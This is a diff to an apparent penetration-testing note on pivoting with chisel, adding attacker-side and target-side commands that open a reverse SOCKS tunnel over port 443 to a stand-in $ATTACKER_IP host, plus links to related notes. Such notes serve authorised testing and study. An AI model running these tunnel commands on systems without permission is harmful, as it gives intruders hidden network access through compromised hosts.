@@ -1,9 +1,20 @@
 # tunneling through chisel - socks
-Tunnel through 443 and open a socks proxy on attacker localhost.
+
+- Tunnel through 443 and open a socks proxy on attacker localhost.
+  - attacker
+    ```bash
+    ./chisel server --port 443 --reverse
+    ```
+  - target
+    ```
+    ./chisel client $ATTACKER_IP:443 R:socks
+    ```
 
 ` zet/20221003150604/README.md `
 
 # Related
+
+- [20221003150107](/zet/20221003150107/README.md) ssh port forwarding
 
 - [20221013222124](/zet/20221013222124/README.md) concept hub for tricks and tips
 - [20221014185949](/zet/20221014185949/README.md) kb file named kb/hacking/commands/pivot-tunnel-through-chisel.md
